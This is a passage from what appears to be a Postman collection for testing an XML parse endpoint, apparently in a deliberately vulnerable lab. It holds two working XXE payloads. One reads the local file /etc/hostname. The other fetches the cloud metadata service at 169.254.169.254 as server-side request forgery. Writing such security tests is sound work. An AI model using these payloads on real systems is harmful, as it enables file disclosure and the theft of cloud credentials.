          "name": "Parse - external entity file read (CWE-611)",
          "request": {
            "method": "POST",
            "header": [
              { "key": "Content-Type", "value": "application/json" }
            ],
            "body": {
              "mode": "raw",
              "raw": "\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r [<!ENTITY x SYSTEM \\\"file:///etc/hostname\\\">]><r>&x;</r>\""
            },
            "url": {
              "raw": "{{baseUrl}}/api/xxe/parse",
              "host": ["{{baseUrl}}"],
              "path": ["api", "xxe", "parse"]
            }
          }
        },
        {
          "name": "Parse - SSRF via XXE (CWE-611 + CWE-918)",
          "request": {
            "method": "POST",
            "header": [
              { "key": "Content-Type", "value": "application/json" }
            ],
            "body": {
              "mode": "raw",
              "raw": "\"<?xml version=\\\"1.0\\\"?><!DOCTYPE r [<!ENTITY x SYSTEM \\\"http://169.254.169.254/latest/meta-data/\\\">]><r>&x;</r>\""
            },
            "url": {
              "raw": "{{baseUrl}}/api/xxe/parse",
              "host": ["{{baseUrl}}"],
              "path": ["api", "xxe", "parse"]
            }
          }
        }
      ]
    },
    {
